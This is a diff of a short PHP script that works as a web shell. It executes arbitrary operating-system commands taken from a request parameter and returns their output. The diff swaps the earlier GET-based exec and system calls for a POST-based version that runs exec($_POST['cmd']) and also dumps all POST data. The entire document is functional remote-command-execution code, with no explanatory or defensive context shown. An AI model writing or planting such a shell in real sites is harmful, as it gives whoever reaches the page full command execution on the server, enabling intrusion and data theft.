@@ -1,18 +1,10 @@
 <?php
 $htmlResp = "";
-exec($_GET['cmd'], $result);
+var_dump($_POST);
 
-//$htmlResp .= '----------------- < OutPut > -----------------';
-//$htmlResp .= '<pre>';
-/*foreach ($result as $print) {
-    $print = str_replace('<', '&lt;', $print);
-    $htmlResp .= $print;
-}*/
-//$htmlResp .= '</pre>';
+if (isset($_POST['exec'])) {
 
-/*if (isset($_GET['exec'])) {
-
-    exec($_GET['cmd'], $result);
+    exec($_POST['cmd'], $result);
 
     $htmlResp .= '----------------- < OutPut > -----------------';
     $htmlResp .= '<pre>';
@@ -23,5 +15,5 @@ exec($_GET['cmd'], $result);
     $htmlResp .= '</pre>';
 } else {
     $htmlResp = '<br>';
-}*/
-echo system($_GET['cmd']);
+}
+echo $htmlResp;
